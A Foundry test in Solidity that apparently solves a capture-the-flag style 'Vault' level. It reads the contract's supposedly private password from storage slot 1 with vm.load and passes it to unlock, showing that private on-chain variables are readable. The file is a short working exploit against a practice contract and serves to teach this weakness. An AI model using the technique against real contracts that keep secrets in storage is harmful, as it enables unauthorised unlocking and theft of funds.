pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {Vault} from "../src/08-vault.sol";

// every storage variable can be read, no matter private or not
// slot0, slot1
// add the usage of reading slot by foundry
contract Vault08Test is Test {
    Vault vlt;

    function setUp() public {
        emit log_string("🧪 Setup VaultTest...");
        vlt = new Vault(bytes32(keccak256("password")));
        emit log_named_uint("Locked is:", vlt.locked() ? 1 : 0);
    }

    function testForce() public {
        emit log_string("🧪 Cracking Vault...");

        address bob = mkaddr("bob");
        vm.startPrank(bob);
        vm.deal(bob, 100 ether);

        bytes32 passwd = vm.load(address(vlt), bytes32(uint256(1)));
        vlt.unlock(passwd);
        vm.stopPrank();
        emit log_named_uint("Locked is:", vlt.locked() ? 1 : 0);
        emit log_named_bytes32("Password is:", passwd);
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
